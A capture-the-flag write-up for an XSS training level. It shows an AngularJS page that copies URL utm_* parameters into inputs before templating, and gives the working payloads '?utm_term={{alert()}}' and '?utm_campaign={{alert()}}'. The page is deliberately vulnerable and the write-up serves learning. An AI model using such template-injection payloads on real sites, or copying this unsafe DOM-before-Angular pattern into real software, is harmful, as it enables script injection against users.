# **XSSGame Level 5**

```
Angular
Angular is a very popular framework that has its own set of rules when it comes to securely developing applications. One of these is that you should be careful when modifying the DOM before Angular's templating system runs.

This challenge demonstrates why this is important.

The goal is again to exploit a vulnerability in the application to make it execute the JavaScript alert() function.

Hint
```

![](https://i.imgur.com/GKy09te.png)

You'll found that `alert()` in Angular is `{{alert()}}`.

![](https://i.imgur.com/z8z8BSz.png)

However, `{{alert()}}` still not the right payload.

```
<!DOCTYPE html>
<html>
  <head>
    <title>Foogle</title>
    <style>
      body {
        background-color: #ffffff;
      }
    </style>
  </head>
  <body ng-app="myApp">
    <div ng-controller="myController">
      <center>
        <img src="/static/img/foogle.png">
        <br>
        <form action="" method="POST">
          <input id="demo2-query" name="query" maxlength="140" ng-model="query" placeholder="Enter query here...">
          <input name="utm_term" type="hidden">
          <input name="utm_campaign" type="hidden" value="cpc">
          <input id="demo2-button" type="submit" value="Search">
        </form>
        <p>You have {{140 - query.length}} characters left.</p>

        
        
      </center>
    </div>

    <script src="/static/js/js_frame.js"></script>
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>
    <script>
      angular.module('myApp', [])
      .controller('myController', ['$scope', function ($scope) {
        $scope.query = "";
        $scope.alert = window.alert;
      }]);

      var UTM_PARAMS = ["utm_content", "utm_medium", "utm_source",
          "utm_campaign", "utm_term"]

      if (location.search)
      {
        var params = location.search.substring(1).split('&');

        for (var p in params) {
          var r = params[p].split('=');

          if (r.length == 2 && UTM_PARAMS.indexOf(r[0]) != -1) {
            var el = document.getElementsByName(r[0]);
            if (el.length) el[0].value = decodeURIComponent(r[1]);
          }
        }
      }
    </script>
  </body>
</html>
```

Then we see that `ng-model="query"` in `<input id="demo2-query" name="query" maxlength="140" ng-model="query" placeholder="Enter query here...">`.

`ng-model` seems parse module for user input in Angular.

Fortunately, we can see that `utm_term` & `utm_campaign` are two more remain attributes which we can inject.

So, `?utm_term={{alert()}}` & `?utm_campaign={{alert()}}` both can pass this.

![](https://i.imgur.com/fl5sj36.png)
